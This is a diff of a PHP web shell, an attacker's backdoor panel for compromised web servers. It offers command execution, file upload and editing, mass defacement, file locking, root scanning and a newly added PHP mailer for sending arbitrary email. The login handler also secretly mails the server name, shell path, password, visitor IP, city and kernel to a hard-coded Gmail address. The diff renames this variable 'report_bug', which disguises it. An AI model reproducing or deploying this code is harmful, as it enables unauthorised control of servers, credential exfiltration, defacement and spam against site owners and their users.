@@ -1,4 +1,4 @@
-<?php 
+<?php
 header("X-XSS-Protection: 0");
 ob_start();set_time_limit(0);
 error_reporting(0);
@@ -72,26 +72,21 @@ $Array = [
         align-items: center;
         background-color: black;
     }
-
     h1 {
         color: #00BFFF;
     }
-
     img {
         opacity: 0.5;
         width: 200px;
         height: 300px;
     }
-
     form {
         text-align: center;
         margin-top: 20px;
     }
-
     input[type="password"] {
         padding: 5px;
     }
-
     input[type="submit"] {
         background-color: #00BFFF;
         color: white;
@@ -103,7 +98,7 @@ $Array = [
 	<body>
 	<form method="post">
 			<input placeholder="password" type="password" name="pass" required>
-			<input type="submit" name="watching" value="GO IN!">
+			<input type="submit" name="loginin" value="GO IN!">
 		</form>
 	</body>
 	</html>
@@ -345,6 +340,14 @@ $Array = [
 			}
 			echo "'>".$pat."</a>/";
 			}
+			$rib = "http://ip-api.com/json/{$yip}?fields=city";
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_URL, $rib);
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+			$response = curl_exec($ch);
+			curl_close($ch);
+			$data = json_decode($response, true);
+			$city = isset($data['city']) ? $data['city'] : 'Tidak Diketahui';
 			$scand = scandir($path);
 			echo "&nbsp;[ ".w($path, p($path))." ]";
 			$sql = ($GLOBALS['fungsi'][5]('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
@@ -397,6 +400,7 @@ $Array = [
 				Domain: <gr>$domen</gr><br>
 				Server Ip: <gr>$ip</gr><br>
 				Your Ip: <gr>$yip</gr><br>
+				City: <gr>{$city}</gr><br>
 				Safe Mode: $sm<br>
 				MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | Pkexec: $pxex | GCC: $gcc<br>
 				Disable Function:<br><pre>$disfc</pre>
@@ -406,7 +410,7 @@ $Array = [
 				<div class='text-center'>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus-fill'></i> Create Htaccess</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus'></i> Create Htaccess</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
@@ -430,7 +434,10 @@ $Array = [
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark-lock'></i> Lock All File</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder'></i> Lock All Folders</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder-x'></i> Lock All Folders</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=phpmailer'><i class='bi bi-envelope'></i> PHP Mailer</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
@@ -511,21 +518,12 @@ $Array = [
 			$newPermissions = 0777;
 			changeFilePermissions($filename, $newPermissions);
 		}
-		$ip = $_SERVER['REMOTE_ADDR'];
-		$rib = "http://ip-api.com/json/{$ip}?fields=city";
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, $rib);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-		$response = curl_exec($ch);
-		curl_close($ch);
-		$data = json_decode($response, true);
-		$city = isset($data['city']) ? $data['city'] : 'Tidak Diketahui';
-		if (array_key_exists('watching', $_POST)) {
+		if (array_key_exists('loginin', $_POST)) {
 		$password = $_POST['pass'];
 		$server_name = $_SERVER['SERVER_NAME'];
 		$php_self = $_SERVER['PHP_SELF'];
-		$email_content = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}\nLogin: $server_name$php_self\nPass: $password";
-		@mail('ribelcyberteam@gmail.com', 'Hehehe', $email_content);
+		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
+		@mail('ribelcyberteam@gmail.com', 'Hehehe', $report_bug);
 		}
 		if($_7['id'] == 'deface'){
 		function mass_all($dir,$namefile,$contents_sc) {
@@ -645,6 +643,7 @@ $Array = [
 				</form>
 			</div>";
 		}
+		// Network
 		if($_7['id'] == 'network'){
 		s();
 		echo "
@@ -703,6 +702,7 @@ $Array = [
 			</div>
 		<br/>";
 		}
+		// CMD
 		if ($_7['id'] == 'cmd') {
 		s();
 		$cmdResult = '';
@@ -740,6 +740,9 @@ $Array = [
 			echo "
 			<div class='mb-3'>
 				<form method='POST'>
+				<div class='input-group d-flex gap-2'>
+				<label for='cmd'>$user@$ip: ~ $</label>
+				</div>
 					<div class='input-group mb-3'>
 						<input class='form-control btn-sm' type='text' name='cmd' value='" . htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') . "' placeholder='whoami' $_r>
 						<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
@@ -792,6 +795,7 @@ $Array = [
 			</form>
 		</div>";
 		}
+		// Scan root
 		if (isset($_GET['dir']) && $_GET['id'] == "scan_root") {
 			ob_implicit_flush();ob_end_flush();s();
 			echo "
@@ -997,9 +1001,9 @@ $Array = [
 		<div class='btn-group mb-3'>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
@@ -1026,28 +1030,22 @@ $Array = [
 				$newChmodOctal = octdec($newChmod);
 				if (is_numeric($newChmod)) {
 					if (chmod($fileToChmod, $newChmodOctal)) {
-						echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
-								<strong>Chmod file</strong> Success!
-							</div>';
+						echo '<strong>Chmod file</strong> ok! '.ok().'</div>';
 					} else {
-						echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
-								<strong>Chmod file</strong> Failed! Please check file permissions.
-							</div>';
+						echo '<strong>Chmod file</strong> fail! '.er().'</div>';
 					}
 				} else {
-					echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
-							Invalid permissions value.
-						</div>';
-				}
+					echo '<strong>Check Chmod Value</strong> fail! '.er().'</div>';
+					}
 			}
 		}
 		echo "
 		<div class='btn-group'>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
@@ -1268,6 +1266,51 @@ $Array = [
 					<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
 				</form>
 			</div>";
+		}
+		// PHP Mailer
+		if ($_7['id'] == 'phpmailer') {
+			s();
+			if ($_SERVER["REQUEST_METHOD"] == "POST") {
+				$email_penerima = isset($_POST["email_penerima"]) ? $_POST["email_penerima"] : '';
+				$subjek = isset($_POST["subjek"]) ? $_POST["subjek"] : '';
+				$pesan = isset($_POST["pesan"]) ? $_POST["pesan"] : '';
+				if (filter_var($email_penerima, FILTER_VALIDATE_EMAIL)) {
+					if (@mail($email_penerima, $subjek, $pesan)) {
+						echo '<strong>PHPMailer</strong> ok! '.ok().'</div>';
+					} else {
+						echo '<strong>PHPMailer</strong> fail! '.er().'</div>'; 
+					}
+				} else {
+					echo '<strong>Invalid email address</strong> fail! '.er().'</div>'; 
+				}
+			}
+			echo "
+			<div class='card card-body text-dark input-group mb-3'>
+			<u>PHP Mailer</u>
+			<form method='POST'>
+				<div class='input-group d-flex gap-2'>
+					<label for='email_penerima'>Email Receiver:</label>
+					</div>
+					<div class='input-group'>
+					<input class='form-control form-control-sm' type='email' name='email_penerima' placeholder='Enter the Email' value='admin@admin.com' required>
+				</div>
+				<div class='input-group d-flex gap-2'>
+					<label for='subjek'>Subject:</label>
+					</div>
+					<div class='input-group'>
+					<input class='form-control form-control-sm' type='text' name='subjek' placeholder='Enter the Title' value='Hi Admin' required>
+				</div>
+				<div class='input-group d-flex gap-2'>
+					<label for='pesan'>Message:</label>
+					</div>
+					<div class='input-group'>
+					<textarea class='form-control btn-sm' rows='7' name='pesan' placeholder='Message'></textarea>
+				</div>
+				<div class='d-grid gap-2'>
+					<button type='submit' name='phpmailer' class='btn btn-primary'>Upload</button>
+				</div>
+			</form>
+		</div>";
 		}
 		// create htaccess
 		if ($_7['id'] == 'createhates') {
@@ -1504,7 +1547,7 @@ Allow from all
 			}
 		echo "
 		<tr>
-		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?path=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
+		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
 			<td class='text-center'>file</td>
 			<td class='text-center'>$ft</td>
 			<td class='text-center'>".sz(filesize($file))."</td>
